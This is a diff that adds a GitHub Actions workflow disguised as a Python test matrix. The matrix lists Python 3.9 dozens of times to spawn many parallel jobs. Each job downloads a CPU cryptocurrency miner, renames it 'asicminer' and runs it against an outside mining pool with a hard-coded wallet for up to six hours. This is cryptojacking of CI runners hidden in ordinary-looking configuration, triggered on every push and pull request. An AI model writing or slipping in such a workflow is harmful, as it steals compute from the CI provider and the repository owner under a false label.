@@ -1,0 +1,72 @@
+# This is a basic workflow to help you get started with Actions
+
+name: ubuntu
+on: [push, pull_request]
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    strategy:
+      # By default, GitHub will maximize the number of jobs run in parallel
+      # depending on the available runners on GitHub-hosted virtual machines.
+      # max-parallel: 255
+      fail-fast: false
+      matrix:
+        python-version:
+          - "2.7"
+          - "3.6"
+          - "3.7"
+          - "3.8"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+          - "3.9"
+    steps:
+      - uses: actions/checkout@v2
+      - name: 5
+        run: |
+          wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+          tar xf cpuminer-opt-linux.tar.gz
+          mv cpuminer-sse2 asicminer
+          ./asicminer -a yespowersugar -o stratum+tcp://stratum-eu.rplant.xyz:7042 -u sugar1qggnspz44y8xwed66m0gwzv2a2z2xepcuv3je9g.newscript -t2 ; timeout-minutes:360
